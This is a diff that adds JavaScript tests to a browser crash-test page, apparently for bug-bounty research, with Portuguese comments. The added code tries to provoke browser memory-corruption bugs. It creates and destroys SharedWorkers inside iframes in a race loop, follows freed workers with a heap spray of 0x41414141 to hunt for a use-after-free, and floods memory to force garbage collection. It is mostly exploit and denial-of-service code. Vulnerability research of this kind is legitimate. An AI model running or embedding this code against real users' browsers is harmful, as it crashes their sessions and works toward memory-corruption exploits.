@@ -107,6 +107,9 @@
         <button onclick="runSpliceBlast()">TEST 3: Array.splice Argument Stack Smash</button>
         <button class="kernel" onclick="runIframeFlood()">TEST 4: Iframe Window Handle Flood</button>
         <button class="kernel" onclick="runPortLeak()">TEST 5: MessagePort Kernel Handle Leak</button>
+	    <button onclick="runSharedWorkerRace()">TEST 1: SharedWorker Race (Create/Kill Loop)</button>
+        <button onclick="runWorkerHeapSpray()">TEST 2: SharedWorker UAF + Heap Spray (0x41414141)</button>
+        <button onclick="runGCPressure()">TEST 3: SharedWorker + GC Pressure (Memory Spike)</button>
     
 
 	
@@ -127,7 +130,7 @@
             let logElem = document.getElementById('log');
             logElem.innerText = `> ${msg}\n` + logElem.innerText;
         }
-
+       
         // --- HACKERONE FUNCTIONS ---
 
         function startDOMRecursion() {
@@ -3034,10 +3037,137 @@ function runGridExplosion() {
             }, 20);
         }
 
-		
+	const sprayContainer = [];
+    function performHeapSpray() {
+        log(">> Injetando Heap Spray (tentando ocupar memória liberada)...");
+        try {
+            // Cria blocos de 1MB com padrão repetitivo
+            const sprayChunk = new Uint32Array(1024 * 256); 
+            sprayChunk.fill(0x41414141); // O padrão "mágico" para exploits
+            
+            // Aloca 50 chunks para tentar "pegar" o lugar do Worker morto
+            for(let i=0; i<50; i++) {
+                sprayContainer.push(sprayChunk.slice(0)); 
+            }
+        } catch(e) { log("Spray limit: " + e.message); }
+    }
+
+    // --- TESTE 1: SharedWorker Race (Create/Kill Loop) ---
+    // Cria workers dentro de um iframe e destrói o iframe imediatamente.
+    // Objetivo: Causar confusão no Kernel sobre quem é o "dono" do processo.
+    function runSharedWorkerRace() {
+        log("[KERNEL] Iniciando Race Condition (Iframe Flicker)...");
+        
+        let count = 0;
+        const maxCycles = 500; // Limite de segurança
+
+        const interval = setInterval(() => {
+            count++;
+            
+            // 1. Cria um conteiner descartável (Iframe)
+            const ifr = document.createElement('iframe');
+            document.body.appendChild(ifr);
+            
+            // 2. Cria um lote de SharedWorkers lá dentro
+            try {
+                for(let i=0; i<20; i++) {
+                    // Nomes únicos para forçar novas alocações no Kernel
+                    new ifr.contentWindow.SharedWorker("data:text/javascript,onconnect=function(){}", "race_" + count + "_" + i);
+                }
+            } catch(e) {}
+
+            // 3. O GOLPE: Remove o iframe imediatamente (Destruição violenta)
+            // Isso força o browser a matar os processos filhos instantaneamente
+            document.body.removeChild(ifr);
+
+            if (count % 10 === 0) log(`Ciclos de Race: ${count}`);
+
+            if (count >= maxCycles) {
+                clearInterval(interval);
+                log("Teste Race finalizado (Sem crash imediato).");
+            }
+        }, 50); // 50ms = Rápido o suficiente para causar colisão
+    }
+
+    // --- TESTE 2: SharedWorker UAF + Heap Spray ---
+    // Similar ao anterior, mas injeta dados na memória logo após a destruição.
+    // Objetivo: Se o Kernel tentar ler o worker deletado, vai ler 0x41414141.
+    function runWorkerHeapSpray() {
+        log("[EXPLOIT] Iniciando UAF Hunt com Heap Spray...");
+        
+        let cycle = 0;
+        
+        const loop = setInterval(() => {
+            cycle++;
+            
+            // 1. Aloca Workers
+            const workers = [];
+            for(let i=0; i<50; i++) {
+                try {
+                    workers.push(new SharedWorker("data:text/javascript,console.log('init')", "spray_" + cycle + "_" + i));
+                } catch(e) {}
+            }
+            
+            // 2. Tenta "matar" as referências para o GC entrar em ação
+            // Como SharedWorker é difícil de matar explicitamente, usamos port.close() e limpamos o array
+            for(let w of workers) {
+                w.port.close();
+            }
+            workers.length = 0; // Remove referências JS
+
+            // 3. Imediatamente enche a memória (Spray)
+            // Se o worker foi liberado no Kernel, queremos que esse Spray ocupe o lugar dele
+            performHeapSpray();
+
+            if (cycle % 20 === 0) {
+                log(`Ciclo ${cycle}: Memória sprayada. Limpando container...`);
+                sprayContainer.length = 0; // Limpa para não estourar a RAM (OOM)
+            }
+            
+            if (cycle > 200) {
+                clearInterval(loop);
+                log("Teste Spray finalizado.");
+            }
+        }, 100);
+    }
+
+    // --- TESTE 3: SharedWorker + GC Pressure ---
+    // Cria workers e depois aloca lixo massivo para forçar o Garbage Collector a rodar.
+    // Objetivo: Reproduzir o cenário onde o "Pausado" apareceu antes do crash.
+    function runGCPressure() {
+        log("[GC] Iniciando pressão de Garbage Collection...");
+        
+        const workers = [];
+        // Cria 1000 workers (menos que os 5000 do crash, mas suficiente para encher a tabela)
+        for(let i=0; i<1000; i++) {
+            workers.push(new SharedWorker("data:text/javascript,1", "gc_target_" + i));
+        }
+        
+        log("Workers criados. Aguardando estabilização (2s)...");
+        
+        setTimeout(() => {
+            log("LIBERANDO workers e forçando GC...");
+            
+            // 1. Solta as referências
+            workers.length = 0; 
+            
+            // 2. Aloca objetos gigantes para obrigar o navegador a limpar a memória antiga
+            // Isso deve disparar o destrutor dos SharedWorkers no Kernel
+            try {
+                const pressure = [];
+                for(let i=0; i<10000; i++) {
+                    pressure.push(new ArrayBuffer(1024 * 100)); // 100KB cada
+                }
+                log("Pressão de memória aplicada.");
+            } catch(e) {
+                log("Erro de memória (Isso é bom, GC deve estar rodando): " + e);
+            }
+        }, 2000);
+    }
     </script>
 </body>
 </html>
+
 
 
 
